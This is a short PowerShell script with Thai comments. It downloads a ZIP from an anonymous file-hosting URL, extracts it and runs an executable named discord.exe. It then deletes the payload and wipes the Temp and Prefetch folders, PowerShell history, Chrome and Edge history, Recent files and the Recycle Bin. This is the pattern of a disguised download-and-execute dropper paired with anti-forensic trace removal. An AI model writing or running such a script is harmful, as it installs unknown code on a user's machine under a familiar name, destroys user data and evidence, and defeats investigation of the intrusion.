```powershell id="a8v2xp"
# ==========================================
# Auto Download ZIP -> Extract -> Run -> Cleanup
# ==========================================

# ตั้งค่า
$zipUrl = "https://files.catbox.moe/0tjan7.zip"
$downloadPath = "$env:TEMP\work.zip"
$extractPath = "$env:TEMP\work"
$runFile = "$extractPath\discord.exe"

Write-Host "Downloading ZIP..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $zipUrl -OutFile $downloadPath

Write-Host "Extracting ZIP..." -ForegroundColor Cyan
Expand-Archive -Path $downloadPath -DestinationPath $extractPath -Force

Write-Host "Running file..." -ForegroundColor Cyan
Start-Process -FilePath $runFile -Wait

Write-Host "Removing extracted files..." -ForegroundColor Cyan
Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $downloadPath -Force -ErrorAction SilentlyContinue

# ==========================================
# Clear Temp Files
# ==========================================
Write-Host "Clearing Temp files..." -ForegroundColor Cyan

$tempFolders = @(
    "$env:TEMP\*",
    "$env:WINDIR\Temp\*",
    "$env:WINDIR\Prefetch\*"
)

foreach ($folder in $tempFolders) {
    Remove-Item -Path $folder -Recurse -Force -ErrorAction SilentlyContinue
}

# ==========================================
# Clear PowerShell History
# ==========================================
Write-Host "Clearing PowerShell history..." -ForegroundColor Cyan

Clear-History

$psHistoryPath = (Get-PSReadLineOption).HistorySavePath
if ($psHistoryPath -and (Test-Path $psHistoryPath)) {
    Remove-Item $psHistoryPath -Force -ErrorAction SilentlyContinue
}

# ==========================================
# Clear Browser History
# ==========================================

# Chrome
Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue
$chromeHistory = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
Remove-Item $chromeHistory -Force -ErrorAction SilentlyContinue

# Edge
Stop-Process -Name msedge -Force -ErrorAction SilentlyContinue
$edgeHistory = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
Remove-Item $edgeHistory -Force -ErrorAction SilentlyContinue

# ==========================================
# Clear Recent Files
# ==========================================
Write-Host "Clearing Recent files..." -ForegroundColor Cyan

Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue

# ==========================================
# Empty Recycle Bin
# ==========================================
Write-Host "Emptying Recycle Bin..." -ForegroundColor Cyan

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

Write-Host "All tasks completed." -ForegroundColor Green
Pause
```
